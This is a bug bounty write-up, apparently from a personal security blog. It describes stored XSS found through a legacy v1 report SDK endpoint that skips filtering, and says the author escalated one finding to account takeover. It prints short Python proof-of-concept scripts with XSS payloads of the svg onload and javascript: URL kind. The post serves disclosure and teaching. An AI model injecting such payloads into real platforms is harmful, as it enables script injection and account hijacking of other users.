<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Hi, I&#39;m Khaled, a cybersecurity engineer passionate about offensive security, software development, and DevSecOps. I specialize in penetration testing, bug bounty hunting, vulnerability research, and security automation. Through my blog, I share practical security knowledge, CTF writeups, tool development insights, and challenge walkthroughs to help the cybersecurity community learn and grow. When I&#39;m not breaking things, I&#39;m building security tools in Rust and Python, contributing to open source projects, and mentoring aspiring security professionals.">
    <meta name="keywords" content="cybersecurity, penetration testing, bug bounty, security research, vulnerability assessment, ethical hacking, security automation, CTF competitions, offensive security, mindpatch">
    <meta name="author" content="Khaled Nassar">

    <title>Legacy SDK Flaws Cause Stored XSS and Account Takeover - @MindPatch</title>

    <link rel="stylesheet" href="/css/style.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/asciinema-player@3.7.0/dist/bundle/asciinema-player.min.css">

    

    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">

    
    <script type="module">
        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';

        mermaid.initialize({
            startOnLoad: false,
            theme: 'dark',
            themeVariables: {
                darkMode: true,
                background: '#1a1a1a',
                primaryColor: '#3a3a3a',
                primaryTextColor: '#e0e0e0',
                primaryBorderColor: '#666',
                lineColor: '#999',
                secondaryColor: '#4a4a4a',
                tertiaryColor: '#2a2a2a',
                fontSize: '16px',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
                nodeBorder: '#666',
                clusterBkg: '#2a2a2a',
                clusterBorder: '#555',
                edgeLabelBackground: 'rgba(0, 0, 0, 0.8)',
                textColor: '#e0e0e0'
            },
            flowchart: {
                nodeSpacing: 100,
                rankSpacing: 100,
                padding: 20,
                useMaxWidth: true
            }
        });

        
        document.addEventListener('DOMContentLoaded', function() {
            
            document.querySelectorAll('pre code, pre.mermaid').forEach((element) => {
                const code = element.textContent.trim();

                
                const isMermaid = code.match(/^(graph|flowchart|sequenceDiagram|classDiagram|stateDiagram|erDiagram|journey|gantt|pie|gitGraph|mindmap|timeline|quadrantChart|requirementDiagram|C4Context)/);

                if (isMermaid || element.classList.contains('language-mermaid') || element.getAttribute('data-lang') === 'mermaid') {
                    const pre = element.tagName === 'PRE' ? element : element.parentElement;

                    
                    const div = document.createElement('div');
                    div.className = 'mermaid';
                    div.textContent = code;

                    
                    if (pre.parentElement) {
                        pre.parentElement.replaceChild(div, pre);
                    }
                }
            });

            
            mermaid.run();
        });
    </script>
</head>
<body>
    <header>
    <a href="/" class="site-logo">
        <img src="/logo.jpg" alt="MindPatch Logo">
    </a>
    <nav>
        
        <a href="/about">about</a>
        
        <a href="/posts">blog</a>
        
        <a href="/projects/">projects</a>
        
        <a href="/index.xml">rss</a>
    </nav>
</header>


    <main>
        
<div class="post-layout">
    <article class="post-article">
        <div class="post-header">
            <h1>Legacy SDK Flaws Cause Stored XSS and Account Takeover</h1>
            <div class="post-meta">
                <span class="post-date">2025-03-14</span>
                
                <span class="post-tags">
                    
                    <a href="/tags/xss" data-tippy-content="View all posts tagged with XSS">#XSS</a>
                    
                    <a href="/tags/account-takeover" data-tippy-content="View all posts tagged with Account Takeover">#Account Takeover</a>
                    
                    <a href="/tags/sdk" data-tippy-content="View all posts tagged with SDK">#SDK</a>
                    
                    <a href="/tags/bug-bounty" data-tippy-content="View all posts tagged with Bug Bounty">#Bug Bounty</a>
                    
                </span>
                
            </div>
        </div>

        <div class="post-content">
            <p><img src="https://miro.medium.com/v2/resize:fit:480/0*wFXpWUgkd4CNm-ov.gif" alt=""></p>
<p>—</p>
<p>Alright, let me tell you a fun story about how a casual day of hunting bugs turned into a serious jackpot — all thanks to some forgotten open source library!</p>
<p>It started like any other day: coffee ready, Burp Suite fired up, and enthusiasm maxed out. I was testing a cool AI-driven reporting/training platform over at example.ai.</p>
<p>These folks were pretty solid when it came to securing their main endpoints; my usual payloads and tests didn’t reveal much initially. However, the moment I stumbled onto their  <code>/reports</code>  page, my curiosity went through the roof. This page was super interactive—it allowed users to create detailed, professional-looking reports with graphs, charts, images, markdown support, etc ..</p>
<p>I tried finding any bugs on this feature but didn’t ended well unfortunately</p>
<p>But after searching around their github organization repos I found a library called  <code>utils_libs</code> and its README.md says that let you create report using python in automated way</p>
<p>and I revealed two versions of their report library:  <code>utils.report.v1</code>  and  <code>utils_libs.report.v2</code>. Considering organizations often neglect older SDK versions during updates, I wondered whether the older  <code>v1</code>  endpoint might still be active</p>
<p>Curiosity piqued, I quickly whipped up a test script using the old, seemingly abandoned  <code>v1</code>  API:</p>
<pre><code class="language-python">import utils_libs  
import utils_libs.reports.v1 as ul

# Setup credentials  
entity = &quot;&lt;REPLACE&gt;&quot;  
project = &quot;&lt;REPLACE&gt;&quot;# Creating a sneaky report  
report = ul.Report(  
    entity=entity,  
    project=project,  
    title=&quot;XSS HERE BE AWARE&quot;,  
    description=&quot;Never gonna give you up, never gonna let you down&quot;  
)# Injecting our little surprise  
report.save()
</code></pre>
<p>after running the script I got the report created on the UI successfully.</p>
<p>I add burpsuite in the mid of the library requests to track it down and I noticed it calls  <strong>different endpoints</strong>!</p>
<p><img src="https://miro.medium.com/v2/resize:fit:320/0*A4q6356PxRgZBIKH.gif" alt=""></p>
<p>When using this endpoint, there is no XSS (Cross-Site Scripting) filter applied to functions that are intended to add links for the report writer. Below is an example of how this vulnerability can be exploited:</p>
<pre><code class="language-python">import utils_libs  
import utils_libs.reports.v1 as ul

# Initialize the utils_libs API  
api = utils_libs.Api()# Define the entity and project  
entity = &quot;&lt;REPLACE&gt;&quot;  # Replace with your utils_libs entity  
project = &quot;&lt;REPLACE&gt;&quot;  # Replace with your utils_libs project# Create a new report  
report = ul.Report(  
    entity=entity,  
    project=project,  
    title=&quot;XSS HERE - BE AWARE&quot;,  
    description=&quot;Never gonna give you up, never gonna let you down&quot;  
)# Add a block with an XSS payload  
report.blocks = [ul.Twitter('&quot;&gt;&lt;svg/onload=alert()&gt;')]# Save the report  
report.save()
</code></pre>
<p>This code successfully stored an XSS payload, which can be accessed via the URL  <code>example.ai/reports/&lt;reportid&gt;</code>. Notably, this report can be viewed by anyone, even if they are not part of my organization</p>
<p><img src="https://miro.medium.com/v2/resize:fit:480/0*XxPwaT6DwUAgyTLX.gif" alt=""></p>
<h1 id="but-wait-theres-more">But wait, there’s more!</h1>
<p>After the excitement of the first payout wore off, I thought, “why not dig a bit deeper?”</p>
<p>Revisiting their repository, I found another interesting feature — embedding videos into reports. Now, embedding videos seemed innocent enough, but experience taught me never to underestimate innocent-looking functionalities.</p>
<p>So, I gave it a try:</p>
<pre><code class="language-python">report = ul.Report(  
    entity=entity,  
    project=project,  
    title=&quot;Another Sneaky XSS&quot;,  
    description=&quot;Keep calm and hack responsibly&quot;  
)  
report.pages = [ul.Video('javascript:alert()')]  
report.save()
</code></pre>
<p>And bingo! Another stored XSS! But this wasn’t just any simple vulnerability — this time, it was even more impactful.</p>
<p>By chaining this XSS with another minor misconfiguration, I escalated it to  <strong>full account takeover</strong>.</p>
<p>That meant I could completely control someone’s account just by tricking them into viewing my crafted report.</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*k2U5b8qynuKX3XRR7LOQOQ.png" alt=""></p>
<p>The team this time higher the impact and higher the bounty which is a good win</p>
<p><img src="https://miro.medium.com/v2/resize:fit:480/0*9HkGy1bjg5R6HlE9.gif" alt=""></p>
<h2 id="side-hint">Side Hint:</h2>
<p>Always dig deeper into seemingly unrelated or forgotten resources. Old API docs, outdated Python SDKs, archived repositories, or forgotten JavaScript files might contain hidden parameters or endpoints. These endpoints often bypass filters or security checks because they aren’t actively maintained, potentially leading to undiscovered vulnerabilities.</p>
<p>And that’s it</p>
<p>Bye ..</p>
<p><img src="https://miro.medium.com/v2/resize:fit:379/0*-Pc5vZ1KCEfJFa0o.gif" alt=""></p>

        </div>
    </article>

    
    
    <aside class="toc-sidebar">
        <div class="toc">
            <div class="toc-title">Table of Contents</div>
        </div>
    </aside>
    
</div>

<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #333;">
    <a href="/posts">← Back to posts</a>
</div>

    </main>

    <footer>
    <p>&copy; 2026 Khaled Nassar</p>
</footer>


    
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/normalize-whitespace/prism-normalize-whitespace.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.js"></script>

    
    <script src="https://unpkg.com/@popperjs/core@2"></script>
    <script src="https://unpkg.com/tippy.js@6"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/fuse.js@7.0.0"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/asciinema-player@3.7.0/dist/bundle/asciinema-player.min.js"></script>

    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            
            Prism.highlightAll();

            
            mediumZoom('article img, .post-content img', {
                margin: 24,
                background: 'rgba(0, 0, 0, 0.9)',
                scrollOffset: 0
            });

            
            renderMathInElement(document.body, {
                delimiters: [
                    {left: '$$', right: '$$', display: true},
                    {left: '$', right: '$', display: false},
                    {left: '\\(', right: '\\)', display: false},
                    {left: '\\[', right: '\\]', display: true}
                ],
                throwOnError: false
            });

            
            if (document.querySelector('.toc')) {
                tocbot.init({
                    tocSelector: '.toc',
                    contentSelector: '.post-content',
                    headingSelector: 'h2, h3, h4',
                    hasInnerContainers: true,
                    collapseDepth: 6,
                    scrollSmooth: true,
                    scrollSmoothDuration: 420,
                    headingsOffset: 40,
                    scrollSmoothOffset: -40,
                    positionFixedSelector: '.toc',
                    fixedSidebarOffset: 'auto',
                    throttleTimeout: 50,
                    includeHtml: false,
                    onClick: function(e) {
                        e.preventDefault();
                        const targetId = e.target.getAttribute('href');
                        const targetElement = document.querySelector(targetId);
                        if (targetElement) {
                            targetElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
                        }
                    }
                });
            }

            
            tippy('[data-tippy-content]', {
                theme: 'custom',
                placement: 'top',
                arrow: true,
                animation: 'scale'
            });

            
            document.querySelectorAll('pre[class*="language-"]').forEach(function(pre) {
                pre.classList.add('line-numbers');
            });
        });
    </script>
</body>
</html>
